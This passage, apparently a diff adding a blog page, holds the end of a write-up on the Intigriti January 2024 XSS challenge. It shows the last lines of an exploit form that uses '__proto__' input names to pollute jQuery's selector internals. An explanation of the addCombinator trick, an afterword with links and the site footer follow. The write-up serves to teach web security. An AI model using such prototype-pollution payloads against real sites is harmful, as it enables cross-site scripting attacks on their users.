+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.TAG.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.dir<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentNode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.selector<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img.loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In fact, the last part with <code>addCombinator</code> was a bit of a guess and a bit of actual knowledge. It’s like a part where <code>dir</code> is used to find matching elements, setting it as the parentNode will keep searching upwards, eventually matching the entire HTML element. This will add <code>src</code> to every element, including iframes.</p>
+<p>I’ve forgotten the details of each function because it was quite complex. If you’re interested, you can directly read the original author’s writeup (link provided below).</p>
+<h2><span id="afterword">Afterword</span></h2><p>I really enjoyed the gradual progression of this challenge, from initially finding an unintended solution and thinking it was simple, to finding the first cache location and thinking I had solved it, only to realize that axios’s prototype pollution couldn’t be used. Then, finding the second <code>compiled.selector</code> and thinking it was over, only to discover it wasn’t.</p>
+<p>To keep digging deeper until reaching <code>addCombinator</code> to confirm that this challenge could indeed be solved, experiencing so many emotional ups and downs within a single challenge indicates that the challenge was well-designed. Another aspect I liked was that it forced you to review the code; without looking at the code, it was impossible to solve. I enjoy code reviews, so I really liked this challenge.</p>
+<p>I admire the author’s ability to continue exploring deeper and find this very interesting solution, combining DOM clobbering and prototype pollution, modifying the jQuery selector’s reference, and creating such a fun challenge!</p>
+<p>I recommend the author’s writeup, which goes through a similar process as mine: <a target="_blank" rel="noopener" href="https://mizu.re/post/intigriti-january-2024-xss-challenge">Intigriti January 2024 - XSS Challenge</a></p>
+<p>In addition, another unintended solution found by @joaxcar is also interesting. If you are interested, you can take a look at: <a target="_blank" rel="noopener" href="https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/">Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)</a></p>
+<p>If you are interested in the original topic, you can also refer to it here: <a target="_blank" rel="noopener" href="https://bugology.intigriti.io/intigriti-monthly-challenges/0124">https://bugology.intigriti.io/intigriti-monthly-challenges/0124</a></p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2024/02/12/en/dicectf-2024-writeup/">DiceCTF 2024 Writeup</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2024 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2024/02/17/intigriti-0124-writeup/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
